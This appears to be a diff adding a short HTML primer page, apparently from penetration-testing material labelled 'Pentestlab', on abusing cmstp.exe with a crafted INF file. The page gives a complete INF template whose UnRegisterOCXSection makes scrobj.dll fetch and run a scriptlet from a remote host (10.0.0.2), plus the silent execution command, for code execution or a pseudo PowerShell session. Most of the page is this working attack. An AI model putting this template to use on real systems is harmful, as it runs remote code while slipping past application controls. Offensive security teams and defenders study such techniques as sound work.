@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>General Primer</title>
+</head><body>Using an .info to call a .sct, you can achieve code execution. <br/>
+Powersct.inf and Powersct.cst together will create a psuedo powershell session<br/>
+sct.inf and sct.sct will allow code exec through scriptlet function<br/>
+<br/>
+The UnRegisterOCXSection needs to contain the URL of the scriptlet. The final INF file needs to contain the following:<br/>
+<br/>
+[version]<br/>
+Signature=$chicago$<br/>
+AdvancedINF=2.5<br/>
+&nbsp;<br/>
+[DefaultInstall_SingleUser]<br/>
+UnRegisterOCXs=UnRegisterOCXSection<br/>
+&nbsp;<br/>
+[UnRegisterOCXSection]<br/>
+%11%\scrobj.dll,NI,http://10.0.0.2/tmp/powersct.sct<br/>
+&nbsp;<br/>
+[Strings]<br/>
+AppAct = "SOFTWARE\Microsoft\Connection Manager"<br/>
+ServiceName="Pentestlab"<br/>
+ShortSvcName="Pentestlab"<br/>
+<br/>
+<br/>
+Execute with <br/>
+cmstp.exe /s sct.inf</body></html>
